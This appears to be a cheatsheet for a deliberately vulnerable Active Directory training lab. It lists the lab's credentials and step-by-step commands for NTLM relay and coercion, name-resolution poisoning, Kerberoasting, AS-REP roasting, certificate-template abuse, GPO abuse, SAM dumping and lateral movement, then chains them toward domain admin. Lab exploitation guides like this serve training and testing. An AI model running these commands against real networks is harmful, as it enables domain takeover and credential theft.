# breakingbAD Exploitation Cheatsheet

Quick reference for exploiting all 12 vulnerabilities in the lab.

**Domain:** `breakingbad.local` | **DC:** `192.168.100.10` | **srv01:** `192.168.100.20` | **srv02:** `192.168.100.21`
**Domain Admin:** `Administrator` / `452dvcZ!`

| User | Password | Group |
|------|----------|-------|
| walter.white | 774azeG! | Methcooks |
| jessie.pinkman | 313lksV! | Methcooks |
| saul.goodman | 657crsH! | Lawyers |
| gustavo.fring | 659ldoK! | Distributors |
| hector.salamanca | 346modL! | Distributors |

---

## Quick Verification (Demo Setup)

Run these to verify the lab is ready:

```bash
# Add domain to /etc/hosts (required for Kerberos)
echo "192.168.100.10 dc01.breakingbad.local breakingbad.local DC01" | sudo tee -a /etc/hosts

# Verify connectivity to all machines
nxc smb 192.168.100.10 192.168.100.20 192.168.100.21 -u Vagrant -p vagrant

# Check ADCS web enrollment - HTTP (vuln 01 ESC8)
curl -s http://192.168.100.10/certsrv/ | grep -q "401" && echo "ESC8: OK (HTTP auth required)"

# Check WebClient on srv02 (vuln 03)
nxc smb 192.168.100.21 -u Vagrant -p vagrant -M webdav

# Check password in description (vuln 07)
nxc ldap 192.168.100.10 -u Vagrant -p vagrant -M get-desc-users

# Check Kerberoastable users (vuln 08)
nxc ldap 192.168.100.10 -u Vagrant -p vagrant --kerberoasting /tmp/kerb.txt && cat /tmp/kerb.txt

# Check ASREProastable users (vuln 09)
nxc ldap 192.168.100.10 -u Vagrant -p vagrant --asreproast /tmp/asrep.txt && cat /tmp/asrep.txt

# Check vulnerable ADCS templates (vuln 10 ESC1)
certipy find -u Vagrant@breakingbad.local -p vagrant -dc-ip 192.168.100.10 -vulnerable -stdout 2>/dev/null | grep -E "ESC1|ESC8"

# Check shared local admin (vuln 12)
nxc smb 192.168.100.20 192.168.100.21 -u svc_admin -p Zomer123! --local-auth
```

---

## 01 - ESC8 (ADCS Web Enrollment)

**Target:** dc01 (CA) + srv02 (coerce target) | **What:** NTLM relay to the ADCS HTTP enrollment endpoint to get a certificate as any machine account.

```bash
# Check if web enrollment is available (HTTP, not HTTPS!)
curl -s http://192.168.100.10/certsrv/ | grep -q "401" && echo "ESC8: HTTP auth required (vulnerable)"

# Terminal 1: Start ntlmrelayx targeting ADCS web enrollment
ntlmrelayx.py -t http://192.168.100.10/certsrv/certfnsh.asp -smb2support --adcs --template Machine

# Terminal 2: Coerce srv02 to authenticate to your relay (use your Kali IP)
coercer coerce -d breakingbad.local -u walter.white -p "774azeG!" -t 192.168.100.21 -l <KALI_IP> --always-continue

# After relay succeeds, you get SRV02$.pfx - authenticate with it
certipy auth -pfx SRV02\$.pfx -dc-ip 192.168.100.10

# Use the machine hash for Silver Ticket or S4U2Self attacks
# Or with the ccache for Kerberos auth:
export KRB5CCNAME=srv02.ccache
nxc smb 192.168.100.21 -k --use-kcache
```

---

## 02 - NTLMv1

**Target:** srv01 | **What:** srv01 accepts NTLMv1 authentication (LmCompatibilityLevel=2). Captured NTLMv1 hashes can be cracked or relayed trivially.

```bash
# Coerce srv01 to authenticate to your listener (e.g. via PetitPotam, PrinterBug)
responder -I eth0 -v --lm

# Capture NTLMv1 hashes (copy to demo/hashes)
cp /usr/share/responder/logs/*NTLMv1* ~/breakingbAD/demo/hashes/ntlmv1.txt

# Crack NTLMv1 hashes (mode 5500)
hashcat -m 5500 ~/breakingbAD/demo/hashes/ntlmv1.txt /usr/share/john/password.lst
# Or use the demo cracker:
~/breakingbAD/demo/hashcrack.sh ntlmv1

# NTLMv1 with ESS can also be submitted to https://crack.sh for free cracking
```

---

## 03 - WebClient (WebDAV Coercion)

**Target:** srv02 | **What:** WebClient service is running, enabling HTTP-based NTLM coercion (no SMB signing required over HTTP).

```bash
# Verify WebClient is running
nxc smb 192.168.100.21 -u walter.white -p '774azeG!' -M webdav

# Coerce authentication via WebDAV (PetitPotam over HTTP)
PetitPotam.py -u walter.white -p '774azeG!' -d breakingbad.local attacker@80/test 192.168.100.21

# Combine with ntlmrelayx for relay attacks
ntlmrelayx.py -t ldap://192.168.100.10 -smb2support
```

---

## 04 - GPO Abuse

**Target:** dc01 / GPO "Los Pollos Hermanos" | **What:** Authenticated Users have full edit rights on the GPO linked to OU=Cartel. Any domain user can inject a scheduled task for RCE.

```bash
# Enumerate GPO permissions
nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' -M gpo_abuse

# Check with BloodHound
bloodhound-python -u walter.white -p '774azeG!' -d breakingbad.local -dc dc01.breakingbad.local -c all

# Abuse with pyGPOAbuse (add local admin or reverse shell)
pygpoabuse.py breakingbad.local/walter.white:'774azeG!' -gpo-id "$(nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' -M gpo_abuse 2>&1 | grep -oP '{[^}]+}')" \
  -command 'net localgroup Administrators walter.white /add' -taskname 'update' -f

# Or use SharpGPOAbuse from Windows
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount walter.white --GPOName "Los Pollos Hermanos"

# Force gpupdate on target (or wait)
nxc smb 192.168.100.20 -u walter.white -p '774azeG!' -x 'gpupdate /force'
```

---

## 05 - IPv6 Poisoning

**Target:** srv02 | **What:** IPv6 is enabled; an attacker can run a rogue DHCPv6 server to MITM traffic and relay credentials.

```bash
# Trigger: reboot srv02 to generate DHCPv6 requests
./lab.sh vuln trigger 5

# Run mitm6 to become the IPv6 DNS server
mitm6 -d breakingbad.local -i eth0

# Combine with ntlmrelayx to relay captured auth
ntlmrelayx.py -6 -t ldaps://192.168.100.10 -wh fake.breakingbad.local -l loot
```

---

## 06 - LLMNR / NBT-NS / mDNS Poisoning

**Target:** srv02 | **What:** Name resolution fallback protocols are enabled. Respond to broadcast queries to capture NTLMv2 hashes.

```bash
# Trigger: walter.white searches for a non-existent share
./lab.sh vuln trigger 6

# Capture hashes with Responder (output to demo/hashes for cracking)
responder -I eth0 -dwv -O ~/breakingbAD/demo/hashes

# Copy captured hashes for cracking
cp /usr/share/responder/logs/*NTLMv2* ~/breakingbAD/demo/hashes/ntlmv2.txt

# Crack captured NTLMv2 hashes (mode 5600)
hashcat -m 5600 ~/breakingbAD/demo/hashes/ntlmv2.txt /usr/share/john/password.lst
# Or use the demo cracker:
~/breakingbAD/demo/hashcrack.sh ntlmv2

# Or relay instead of cracking
ntlmrelayx.py -tf targets.txt -smb2support
```

---

## 07 - Password in User Description

**Target:** dc01 / saul.goodman | **What:** saul.goodman's password is stored in his AD description field. Any authenticated user can read it.

```bash
# Query with netexec
nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' -M get-desc-users

# Query with ldapsearch
ldapsearch -x -H ldap://192.168.100.10 -D 'walter.white@breakingbad.local' -w '774azeG!' \
  -b 'OU=Cartel,DC=breakingbad,DC=local' '(sAMAccountName=saul.goodman)' description

# Or with rpcclient
rpcclient -U 'walter.white%774azeG!' 192.168.100.10 -c 'queryuser saul.goodman'

# Verify the password works
nxc smb 192.168.100.10 -u saul.goodman -p '657crsH!'
```

---

## 08 - Kerberoasting

**Target:** dc01 / hector.salamanca (SPN: HTTP/srv01) | **What:** hector.salamanca has an SPN assigned. Request a TGS ticket and crack it offline.

```bash
# Find kerberoastable users (output to demo/hashes)
nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' --kerberoasting ~/breakingbAD/demo/hashes/kerberoast.txt

# Or with impacket
GetUserSPNs.py breakingbad.local/walter.white:'774azeG!' -dc-ip 192.168.100.10 -request -outputfile ~/breakingbAD/demo/hashes/kerberoast.txt

# Crack the TGS hash (mode 13100)
hashcat -m 13100 ~/breakingbAD/demo/hashes/kerberoast.txt /usr/share/john/password.lst
# Or use the demo cracker:
~/breakingbAD/demo/hashcrack.sh kerberoast

# Verify cracked password
nxc smb 192.168.100.10 -u hector.salamanca -p '346modL!'
```

---

## 09 - ASREPRoasting

**Target:** dc01 / jessie.pinkman | **What:** jessie.pinkman has Kerberos pre-auth disabled. Request an AS-REP without knowing the password and crack it offline.

```bash
# Find users without pre-auth (output to demo/hashes)
nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' --asreproast ~/breakingbAD/demo/hashes/asreproast.txt

# Or with impacket (no creds needed if you know the username)
GetNPUsers.py breakingbad.local/jessie.pinkman -dc-ip 192.168.100.10 -no-pass -format hashcat -outputfile ~/breakingbAD/demo/hashes/asreproast.txt

# Or enumerate all vulnerable users
GetNPUsers.py breakingbad.local/ -dc-ip 192.168.100.10 -usersfile users.txt -no-pass

# Crack the AS-REP hash (mode 18200)
hashcat -m 18200 ~/breakingbAD/demo/hashes/asreproast.txt /usr/share/john/password.lst
# Or use the demo cracker:
~/breakingbAD/demo/hashcrack.sh asreproast

# Verify cracked password
nxc smb 192.168.100.10 -u jessie.pinkman -p '313lksV!'
```

---

## 10 - ESC1 (Certificate Template Abuse)

**Target:** dc01 | **What:** Vulnerable certificate template allows specifying a Subject Alternative Name (SAN). Request a cert as any user including Domain Admin.

```bash
# Find vulnerable templates
certipy find -u walter.white@breakingbad.local -p '774azeG!' -dc-ip 192.168.100.10 -vulnerable -stdout

# Request a certificate as Administrator using the ESC1 template
certipy req -u walter.white@breakingbad.local -p '774azeG!' -dc-ip 192.168.100.10 \
  -target dc01.breakingbad.local -ca breakingbad-ca -template ESC1 \
  -upn administrator@breakingbad.local

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip 192.168.100.10

# Use the NT hash to access the DC
nxc smb 192.168.100.10 -u Administrator -H <nthash> --shares
```

---

## 11 - Anonymous Logon (Pre-Windows 2000)

**Target:** dc01 | **What:** Anonymous Logon is in the Pre-Windows 2000 Compatible Access group. Unauthenticated LDAP enumeration is possible.

```bash
# Enumerate users without credentials
nxc ldap 192.168.100.10 -u '' -p '' --users

# Enumerate with ldapsearch (anonymous bind)
ldapsearch -x -H ldap://192.168.100.10 -b 'DC=breakingbad,DC=local' '(objectClass=user)' sAMAccountName description

# Enumerate with rpcclient
rpcclient -U '' -N 192.168.100.10 -c 'enumdomusers'

# Enumerate with enum4linux-ng
enum4linux-ng -A 192.168.100.10
```

---

## 12 - Shared Local Admin Password

**Target:** srv01 + srv02 | **Creds:** `svc_admin` / `Zomer123!` | **What:** Same local admin account on both servers. Compromise one, move laterally to the other.

```bash
# Verify creds work on both servers
nxc smb 192.168.100.20 192.168.100.21 -u svc_admin -p 'Zomer123!' --local-auth

# Dump SAM on srv01
nxc smb 192.168.100.20 -u svc_admin -p 'Zomer123!' --local-auth --sam

# Use same creds to move to srv02
nxc smb 192.168.100.21 -u svc_admin -p 'Zomer123!' --local-auth -x 'whoami'

# Or get a shell with psexec
psexec.py svc_admin:'Zomer123!'@192.168.100.20
psexec.py svc_admin:'Zomer123!'@192.168.100.21
```

---

## Attack Chains

These vulns combine well for demo scenarios:

**Chain 1: Poisoning to Domain Admin**
`06 (Responder) -> crack hash -> 04 (GPO abuse) -> local admin on srv01 -> 12 (lateral to srv02)`

**Chain 2: ADCS Escalation**
`09 (ASREPRoast jessie) -> auth as jessie -> 10 (ESC1 cert as Admin) -> Domain Admin`

**Chain 3: Relay Attack**
`03 (WebClient coerce srv02) -> 01 (relay to ADCS web enrollment) -> cert as machine -> DCSync`

**Chain 4: Recon to Lateral Movement**
`11 (anon enum users) -> 07 (find saul's password in description) -> 08 (kerberoast hector) -> 12 (shared admin -> lateral)`
